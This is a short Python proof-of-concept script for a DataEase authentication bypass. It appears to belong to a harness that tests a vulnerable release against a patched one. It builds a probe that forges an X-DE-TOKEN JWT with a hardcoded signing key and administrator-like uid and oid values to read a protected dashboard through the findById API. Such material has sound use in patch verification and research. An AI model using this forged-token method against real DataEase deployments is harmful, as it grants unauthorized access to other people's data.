#!/usr/bin/env python3
"""[GIVEN] ORIGINAL PoC -- CVE-2024-52295 (main-auth forged JWT).

Forge a main-auth token (X-DE-TOKEN) with the pre-2.10.2 hardcoded key and the
hardcoded uid=1/oid=1, then read the planted flag dashboard via the protected
endpoint. Reaches the flag on v0 (2.10.1, no core-side signature verification /
hardcoded-key era); blocked on v1 (2.10.23, signature verified against a
generated non-hardcoded secret introduced by the CVE-2024-52295 fix).

Driven against the REAL DataEase HTTP API (POST /de2api/dataVisualization/findById).
"""
from __future__ import annotations

import json
import sys

RESOURCE_ID = 777000777
ORIGINAL_KEY = "83d923c9f1d8fcaa46cae0ed2aaa81b5"


def candidate(flag: str = "") -> dict:
    """Seed candidate: forge X-DE-TOKEN with the hardcoded main-auth key."""
    return {
        "probe_id": "cve-2024-52295-main-auth-jwt",
        "method": "POST",
        "path": "/de2api/dataVisualization/findById",
        "header": "X-DE-TOKEN",
        "key": ORIGINAL_KEY,
        "uid": 1,
        "oid": 1,
        "resource_id": RESOURCE_ID,
        "body": {"id": RESOURCE_ID, "busiFlag": "dashboard"},
        "flag": flag,
    }


if __name__ == "__main__":
    flag = sys.argv[1] if len(sys.argv) > 1 else ""
    print(json.dumps(candidate(flag)))
